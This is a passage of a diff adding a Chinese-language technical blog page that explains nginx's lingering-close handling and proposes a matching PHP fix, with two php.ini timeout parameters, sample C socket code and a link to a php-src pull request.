+        <span class="n">ngx_http_close_request</span><span class="p">(</span><span class="n">r</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+        <span class="k">return</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="n">wev</span> <span class="o">=</span> <span class="n">c</span><span class="o">-&gt;</span><span class="n">write</span><span class="p">;</span>
+    <span class="n">wev</span><span class="o">-&gt;</span><span class="n">handler</span> <span class="o">=</span> <span class="n">ngx_http_empty_handler</span><span class="p">;</span>
+
+    <span class="k">if</span> <span class="p">(</span><span class="n">wev</span><span class="o">-&gt;</span><span class="n">active</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="n">ngx_event_flags</span> <span class="o">&amp;</span> <span class="n">NGX_USE_LEVEL_EVENT</span><span class="p">))</span> <span class="p">{</span>
+        <span class="k">if</span> <span class="p">(</span><span class="n">ngx_del_event</span><span class="p">(</span><span class="n">wev</span><span class="p">,</span> <span class="n">NGX_WRITE_EVENT</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span> <span class="o">!=</span> <span class="n">NGX_OK</span><span class="p">)</span> <span class="p">{</span>
+            <span class="n">ngx_http_close_request</span><span class="p">(</span><span class="n">r</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+            <span class="k">return</span><span class="p">;</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+
+    <span class="k">if</span> <span class="p">(</span><span class="n">ngx_shutdown_socket</span><span class="p">(</span><span class="n">c</span><span class="o">-&gt;</span><span class="n">fd</span><span class="p">,</span> <span class="n">NGX_WRITE_SHUTDOWN</span><span class="p">)</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">ngx_connection_error</span><span class="p">(</span><span class="n">c</span><span class="p">,</span> <span class="n">ngx_socket_errno</span><span class="p">,</span>
+                             <span class="n">ngx_shutdown_socket_n</span> <span class="s">&quot; failed&quot;</span><span class="p">);</span>
+        <span class="n">ngx_http_close_request</span><span class="p">(</span><span class="n">r</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+        <span class="k">return</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="k">if</span> <span class="p">(</span><span class="n">rev</span><span class="o">-&gt;</span><span class="n">ready</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">ngx_http_lingering_close_handler</span><span class="p">(</span><span class="n">rev</span><span class="p">);</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+</pre></div>
+</div>
+</div>
+<div class="section" id="php">
+<h2><a class="toc-backref" href="#id21">5&nbsp;&nbsp;&nbsp;php的解决办法</a></h2>
+<div class="section" id="id7">
+<h3><a class="toc-backref" href="#id22">5.1&nbsp;&nbsp;&nbsp;思路</a></h3>
+<p>学习nginx的lingering机制，在php.ini里增加两个参数来约束接受最后clinet的无用数据</p>
+<ul class="simple">
+<li>lingering_time_s：接受无用数据的最长时间，单位是秒</li>
+<li>lingering_timeout_ms：idle timeout机制，在lingering_timeout_ms时间内都没有收到数据的话，就关闭socket，停止接收数据，单位是毫秒</li>
+</ul>
+</div>
+<div class="section" id="refer-core-code">
+<h3><a class="toc-backref" href="#id23">5.2&nbsp;&nbsp;&nbsp;refer core code</a></h3>
+<div class="highlight"><pre><span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">8</span><span class="p">];</span>
+<span class="kt">time_t</span> <span class="n">start</span><span class="p">,</span> <span class="n">end</span><span class="p">;</span>
+<span class="kt">int</span> <span class="n">sec</span><span class="p">;</span>
+
+<span class="n">shutdown</span><span class="p">(</span><span class="n">req</span><span class="o">-&gt;</span><span class="n">fd</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
+<span class="k">if</span> <span class="p">(</span><span class="n">PG</span><span class="p">(</span><span class="n">lingering_timeout_ms</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">struct</span> <span class="n">timeval</span> <span class="n">ltimeout</span> <span class="o">=</span> <span class="p">{</span><span class="n">PG</span><span class="p">(</span><span class="n">lingering_timeout_ms</span><span class="p">)</span><span class="o">/</span><span class="mi">1000</span><span class="p">,</span> <span class="mi">1000</span> <span class="o">*</span> <span class="p">(</span><span class="n">PG</span><span class="p">(</span><span class="n">lingering_timeout_ms</span><span class="p">)</span> <span class="o">%</span> <span class="mi">1000</span><span class="p">)};</span>
+    <span class="n">setsockopt</span><span class="p">(</span><span class="n">req</span><span class="o">-&gt;</span><span class="n">fd</span><span class="p">,</span> <span class="n">SOL_SOCKET</span><span class="p">,</span> <span class="n">SO_RCVTIMEO</span><span class="p">,</span> <span class="p">(</span><span class="k">const</span> <span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">ltimeout</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">ltimeout</span><span class="p">));</span>
+<span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">PG</span><span class="p">(</span><span class="n">lingering_time_s</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">struct</span> <span class="n">timeval</span> <span class="n">ltimeout</span> <span class="o">=</span> <span class="p">{</span><span class="n">PG</span><span class="p">(</span><span class="n">lingering_time_s</span><span class="p">),</span> <span class="mi">0</span><span class="p">};</span>
+    <span class="n">setsockopt</span><span class="p">(</span><span class="n">req</span><span class="o">-&gt;</span><span class="n">fd</span><span class="p">,</span> <span class="n">SOL_SOCKET</span><span class="p">,</span> <span class="n">SO_RCVTIMEO</span><span class="p">,</span> <span class="p">(</span><span class="k">const</span> <span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">ltimeout</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">ltimeout</span><span class="p">));</span>
+<span class="p">}</span>
+
+<span class="n">time</span><span class="p">(</span><span class="o">&amp;</span><span class="n">start</span><span class="p">);</span>
+<span class="k">while</span> <span class="p">(</span><span class="n">recv</span><span class="p">(</span><span class="n">req</span><span class="o">-&gt;</span><span class="n">fd</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buf</span><span class="p">),</span> <span class="mi">0</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+     <span class="k">if</span> <span class="p">(</span><span class="n">PG</span><span class="p">(</span><span class="n">lingering_time_s</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+         <span class="n">time</span><span class="p">(</span><span class="o">&amp;</span><span class="n">end</span><span class="p">);</span>
+         <span class="n">sec</span> <span class="o">=</span> <span class="p">(</span><span class="kt">int</span><span class="p">)(</span><span class="n">end</span><span class="o">-</span><span class="n">start</span><span class="p">);</span>
+         <span class="k">if</span> <span class="p">(</span><span class="n">sec</span> <span class="o">&gt;</span> <span class="n">PG</span><span class="p">(</span><span class="n">lingering_time_s</span><span class="p">))</span> <span class="p">{</span>
+             <span class="k">break</span><span class="p">;</span>
+         <span class="p">}</span>
+     <span class="p">}</span>
+ <span class="p">}</span>
+</pre></div>
+</div>
+<div class="section" id="githubpr">
+<h3><a class="toc-backref" href="#id24">5.3&nbsp;&nbsp;&nbsp;github上的PR</a></h3>
+<pre class="literal-block">
+https://github.com/php/php-src/pull/966
+</pre>
+</div>
+</div>
+
+                </div><!-- /.entry-content -->
+        </article>
+</section>
+        </div><!--/span-->
+
+                <div class="span3 well sidebar-nav" id="sidebar">
+<ul class="nav nav-list">
+
+<li class="nav-header"><h4><i class="icon-folder-close icon-large"></i>Categories</h4></li>
+<li>
+<a href="/category/php.html">
+    <i class="icon-folder-open icon-large"></i>php
+</a>
+</li>
+
+<li class="nav-header"><h4><i class="icon-tags icon-large"></i>Tags</h4></li>
+<li class="tag-3">
+    <a href="/tag/security.html">
+        <i class="icon-tag icon-large"></i>security
+    </a>
+</li>
+<li class="tag-1">
+    <a href="/tag/.html">
+        <i class="icon-tag icon-large"></i>
+    </a>
+</li>
+<li class="tag-1">
+    <a href="/tag/all.html">
+        <i class="icon-tag icon-large"></i>all
+    </a>
+</li>
+
+
+</ul>        </div><!--/.well -->
+
+      </div><!--/row-->
+
+      <hr>
+
+      <footer>
+        <address id="about">
+                Proudly powered by <a href="http://pelican.notmyidea.org/">Pelican <i class="icon-external-link"></i></a>,
+                                which takes great advantage of <a href="http://python.org">Python <i class="icon-external-link"></i></a>.
+        </address><!-- /#about -->
+
+        <p>The theme is from <a href="http://twitter.github.com/bootstrap/">Bootstrap from Twitter <i class="icon-external-link"></i></a>,
+                   and <a href="http://fortawesome.github.com/Font-Awesome/">Font-Awesome <i class="icon-external-link"></i></a>, thanks!</p>
+      </footer>
+
+    </div><!--/.fluid-container-->
+
+
+
+    <!-- Le javascript -->
+    <!-- Placed at the end of the document so the pages load faster -->
+    <script src="/theme/js/jquery-1.7.2.min.js"></script>
+    <script src="/theme/js/bootstrap.min.js"></script>
+  </body>
+</html>
